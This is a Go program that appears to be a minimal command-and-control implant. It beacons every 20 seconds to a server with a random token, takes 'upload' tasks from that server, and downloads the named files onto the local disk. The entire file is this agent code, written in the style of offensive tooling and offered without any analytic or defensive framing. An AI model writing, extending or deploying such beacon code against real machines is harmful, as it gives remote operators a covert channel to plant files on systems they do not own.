package main

import (
    "fmt"
    "io"
    "math/rand"
    "net/http"
    "os"
    "strings"
    "time"
)

func init() {
    rand.Seed(time.Now().UnixNano())
}

func randomString(n int) string {
    letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
    s := make([]rune, n)
    for i := range s {
        s[i] = letters[rand.Intn(len(letters))]
    }
    return string(s)
}

func beacon(serverURL, token string, interval time.Duration) {
    for {
        url := fmt.Sprintf("%s/request_token?token=%s", serverURL, token)
        fmt.Printf("[*] Beaconing to %s\n", url)

        client := http.Client{Timeout: 60 * time.Second}
        resp, err := client.Get(url)
        if err != nil {
            fmt.Println("[!] Error contacting server:", err)
            time.Sleep(interval)
            continue
        }

        if resp.StatusCode == 200 {
            // Instead of always assuming it's a file,
            // first check if it's a command string
            body, _ := io.ReadAll(resp.Body)
            resp.Body.Close()
            command := string(body)

            if strings.HasPrefix(command, "upload ") {
                filename := strings.TrimSpace(strings.TrimPrefix(command, "upload "))
                downloadURL := fmt.Sprintf("%s/download?file=%s", serverURL, filename)
                fmt.Printf("[*] Command received: upload %s\n", filename)
                downloadFile(downloadURL, filename)
            } else {
                fmt.Println("[*] Unknown task from server:", command)
            }

        } else if resp.StatusCode == 204 {
            fmt.Println("[*] No task, sleeping...")
            resp.Body.Close()
        } else {
            body, _ := io.ReadAll(resp.Body)
            fmt.Printf("[*] Server response (%d): %s\n", resp.StatusCode, string(body))
            resp.Body.Close()
        }

        time.Sleep(interval) // wait before next beacon
    }
}

func downloadFile(url, filename string) {
    fmt.Printf("[*] Downloading file from %s\n", url)

    resp, err := http.Get(url)
    if err != nil {
        fmt.Println("[!] Error downloading file:", err)
        return
    }
    defer resp.Body.Close()

    out, err := os.Create(filename)
    if err != nil {
        fmt.Println("[!] Error creating file:", err)
        return
    }
    defer out.Close()

    _, err = io.Copy(out, resp.Body)
    if err != nil {
        fmt.Println("[!] Error saving file:", err)
    } else {
        fmt.Printf("[+] File saved as %s\n", filename)
    }
}

func main() {
    serverURL := "http://localhost:8080"
    token := randomString(16)
    interval := 20 * time.Second // beacon interval

    fmt.Printf("[*] Generated token: %s\n", token)
    beacon(serverURL, token, interval)
}
